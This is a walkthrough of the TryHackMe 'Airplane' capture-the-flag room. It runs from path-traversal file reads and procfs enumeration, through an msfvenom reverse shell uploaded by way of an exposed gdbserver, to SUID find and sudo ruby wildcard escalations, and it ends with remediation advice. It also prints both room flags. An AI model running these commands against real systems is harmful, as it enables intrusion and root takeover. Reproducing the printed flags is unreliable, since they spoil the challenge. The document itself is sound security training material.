# Airplane: Complete TryHackMe Walkthrough

Official room: https://tryhackme.com/room/airplane

## Room Overview & Information

**Difficulty:** Medium  
**Category:** Linux exploitation, local file inclusion, remote debugging service abuse, privilege escalation  
**Key concepts:** Nmap, hostname mapping, path traversal/LFI, Linux procfs, GDB server exposure, SUID ownership, sudoers wildcard abuse.

This write-up describes the intended chain from the author's recorded room instance. Machine IPs and process IDs change between deployments. Replace every occurrence of MACHINE_IP with the currently assigned address and verify every result before proceeding.

## Phase 1: Reconnaissance & Enumeration

### 1. Start the machine and scan all TCP ports

```bash
nmap -T4 -n -sC -sV -Pn -p- -oN airplane-full.txt MACHINE_IP
```

- `-T4` uses a faster timing template.
- `-n` disables DNS lookups.
- `-sC` runs Nmap's default scripts.
- `-sV` probes for service/version information.
- `-Pn` skips host discovery and scans as though the host is online.
- `-p-` scans TCP ports 1 through 65535.
- `-oN` saves a readable report.

The recorded instance exposes TCP 22 (SSH), 6048 (unusual remote debugging service), and 8000 (HTTP). The web service identifies Werkzeug/Python and redirects to the hostname `airplane.thm`.

### 2. Map the hostname

Add the current target IP to the local hosts file if the lab redirects to `airplane.thm`:

```bash
echo "MACHINE_IP airplane.thm" | sudo tee -a /etc/hosts
getent hosts airplane.thm
```

The second command verifies the mapping. Do not paste an old room IP into the file; it will become stale when the machine is redeployed.

### 3. Inspect the web application

Open `http://airplane.thm:8000/`. The page parameter in the redirect is an important clue:

```bash
curl -i 'http://airplane.thm:8000/?page=index.html'
```

The `-i` option includes response headers. Next, test whether the parameter can read a known, non-secret system file:

```bash
curl -sG --data-urlencode 'page=../../../../etc/passwd' 'http://airplane.thm:8000/'
```

- `-s` suppresses curl's progress meter.
- `-G` puts supplied data into the query string.
- `--data-urlencode` encodes the parameter value correctly.

When the response contains the local account database, this confirms an unsanitized local file inclusion/path traversal issue. The vulnerable parameter is being used to choose server-side content without restricting the path.

### 4. Identify the process bound to TCP 6048

The service scan cannot positively identify the service on 6048. Linux process command lines may be exposed through procfs at `/proc/PID/cmdline`. The LFI can be used to read candidate command lines. Create a local PID list:

```bash
seq 1 2000 > pids.txt
```

Then use ffuf to substitute PID candidates into the path:

```bash
ffuf -w pids.txt -u 'http://airplane.thm:8000/?page=../../../../proc/FUZZ/cmdline' -fs 14
```

- `-w` names the wordlist.
- `-u` specifies the request URL.
- `FUZZ` is the substitution marker.
- `-fs 14` filters responses with the known 14-byte baseline length; confirm this baseline for the current target instead of assuming it is universal.

A process command line containing `gdbserver 0.0.0.0:6048` identifies the service listening on the unusual port. Process IDs can change, so the recorded PID 527 is an example from the prior instance, not a guaranteed answer for future deployments.

## Phase 2: Vulnerability Analysis & Initial Access

### 5. Understand the exposed GDB server

GDB server supports remote debugging. If exposed to an untrusted network without authentication, it can allow a remote debugger to upload and execute a binary. This is not normal public application functionality and is a severe configuration error.

The recorded chain uses an x86-64 Linux ELF reverse-shell payload. Confirm the attacker VPN interface first; use the address assigned to the AttackBox or VPN, not an unrelated LAN address.

```bash
ip addr
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_TUN0 LPORT=4444 PrependFork=true -f elf -o shell.elf
chmod +x shell.elf
file shell.elf
```

- `LHOST` is the attack host address reachable from the lab machine.
- `LPORT` is the listener port.
- `PrependFork=true` adds a fork behaviour used by this GDB-server exploitation method.
- `-f elf` selects ELF binary output.
- `-o shell.elf` names the output file.
- `chmod +x` marks the file executable.
- `file` confirms the output architecture and format.

Run this only in the room. A reverse shell payload is executable code; do not upload or execute it on a system outside the authorized target.

### 6. Start a listener and connect through GDB

In a second terminal, listen for the callback:

```bash
nc -lvnp 4444
```

Open the local payload using GDB (or gdb-multiarch where required by the analysis environment):

```text
gdb shell.elf
(gdb) set architecture i386:x86-64
(gdb) target extended-remote MACHINE_IP:6048
(gdb) remote put shell.elf /tmp/shell.elf
(gdb) set remote exec-file /tmp/shell.elf
(gdb) run
```

- `target extended-remote` selects GDB's extended remote protocol, which supports operations such as remote file transfer and starting the remote executable.
- `remote put` copies the local payload to the specified remote path.
- `set remote exec-file` chooses the remote executable.
- `run` starts it under the remote debugger.

A callback should arrive at the listener if the address, port, architecture, and network path are correct. Verify the identity before claiming success:

```bash
whoami
id
hostname
pwd
```

The initial shell in the recorded instance runs as `hudson`, not root. For a more usable shell, if Python is installed:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Phase 3: Privilege Escalation & Post-Exploitation

### 7. Find the SUID anomaly

Search for SUID executables:

```bash
find / -perm -4000 -type f 2>/dev/null
ls -l /usr/bin/find
```

The notable binary in this instance is `/usr/bin/find`, owned by `carlos` with SUID set. SUID means the process's effective UID becomes the file owner's UID when executed. This is dangerous because find can launch another program through its `-exec` feature.

In the lab, the following command launches Bash while preserving the effective UID:

```bash
/usr/bin/find . -exec /bin/bash -p \; -quit
id
cat /home/carlos/user.txt
```

The `-p` option tells Bash to preserve its privileged effective identity. The identity output should show the effective user as carlos. The user flag from the recorded instance is:

```text
eebfca2ca5a2b8a56c46c781aeea7562
```

### 8. Establish a clean Carlos session

The SUID shell can have a real UID of hudson and an effective UID of carlos. This distinction matters: some programs, including sudo, make decisions using more than one UID. If the room requires a normal Carlos login, create a temporary lab-only SSH key pair locally and add only its public key to Carlos's authorized_keys using the elevated shell. Do not reuse or publish a personal SSH key. Remove the temporary key and authorized_keys entry when finished if the lab permits cleanup.

Verify the new SSH session:

```bash
ssh carlos@MACHINE_IP
id
sudo -l
```

The recorded sudo policy permits Carlos to run Ruby as root for Ruby scripts matching the root-directory wildcard:

```text
(ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```

This wildcard rule is too broad because it does not safely constrain the canonical path of the Ruby script.

### 9. Exploit the sudoers wildcard in the lab

Create a harmless Ruby script in a writable temporary directory:

```bash
printf '%s\n' 'exec "/bin/bash"' > /tmp/shell.rb
cat /tmp/shell.rb
```

The command runs Ruby's exec method to replace the interpreter process with Bash. The sudoers rule's wildcard can be abused with a path containing a parent-directory traversal:

```bash
sudo /usr/bin/ruby /root/../tmp/shell.rb
id
cat /root/root.txt
```

This relies on the specific vulnerable sudoers pattern in the room. Do not generalize it as a universal sudo bypass; sudo versions and policy matching rules matter. In the recorded instance, the root flag is:

```text
190dcbeb688ce5fe029f26a1e5fce002
```

## Phase 4: Room Questions & Flags Walkthrough

| Question or objective | Evidence / answer from the recorded instance |
|---|---|
| Identify the web application | Werkzeug/Python on TCP 8000 |
| Determine why TCP 6048 matters | Procfs command line identifies gdbserver |
| Obtain initial access | GDB-server misuse yields hudson shell |
| Obtain user flag | `/home/carlos/user.txt`: `eebfca2ca5a2b8a56c46c781aeea7562` |
| Obtain root flag | Ruby sudoers wildcard issue yields root; `/root/root.txt`: `190dcbeb688ce5fe029f26a1e5fce002` |

Machine-specific values such as PID, target IP, and the exact command-line output must be verified from the active instance.

## Phase 5: Key Takeaways & Remediation

- Do not expose a remote debugger to untrusted networks. Bind it to loopback, firewall the port, and require authenticated access.
- Never let a user-controlled path choose arbitrary local files. Canonicalize and allowlist file names and serve fixed resources.
- Audit SUID files and remove the SUID bit from general-purpose tools such as find unless a tightly justified requirement exists.
- Avoid sudoers wildcard rules over privileged script paths. Permit a specific root-owned script with fixed arguments and strict permissions.
- Treat persistence changes such as adding SSH keys as temporary lab actions; clean up after the assessment.
- Validate each privilege transition with `id` and preserve evidence.

The chain is important because each weakness crosses a different trust boundary: file read, remote debug execution, SUID identity transition, then unsafe sudo authorization. Fix each boundary independently.